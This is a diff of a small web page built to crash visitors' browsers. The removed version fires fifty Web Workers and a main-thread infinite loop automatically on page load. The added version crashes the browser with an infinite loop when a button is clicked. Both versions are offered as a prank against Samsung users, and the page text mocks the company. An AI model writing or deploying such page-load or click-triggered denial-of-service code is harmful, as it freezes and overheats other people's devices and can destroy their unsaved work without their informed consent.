@@ -1,38 +1,19 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Powerful Browser Crasher</title>
-    <script>
-      // Function to create Web Worker that runs infinite loop
-      function createCrasher() {
-        const blob = new Blob([
-          `onmessage = function() {
-              while (true) {
-                let x = Math.random() * Math.random();
-              }
-          }`
-        ], { type: 'application/javascript' });
-
-        const worker = new Worker(URL.createObjectURL(blob));
-        worker.postMessage('start');
-      }
-
-      window.onload = function () {
-        // Run multiple web workers to fully fry browser
-        for (let i = 0; i < 50; i++) {
-          createCrasher();
-        }
-
-        // Also run infinite loop on main thread
-        while (true) {
-          let x = Math.random() * Math.random();
-          console.log("Samsung bekaar company hai!");
-        }
-      };
-    </script>
+    <title>Browser Crash Test</title>
   </head>
   <body>
-    <h1>Browser Doom Activated!</h1>
-    <p>Samsung = Crash + Lag + Heat = Disaster!</p>
+    <h1>Samsung Users: Brace Yourself!</h1>
+    <p>Click the button below to crash your browser (for fun).</p>
+    <button onclick="crash()">Crash Browser</button>
+
+    <script>
+      function crash() {
+        while (true) {
+          console.log("Samsung is trash! Crashing...");
+        }
+      }
+    </script>
   </body>
 </html>
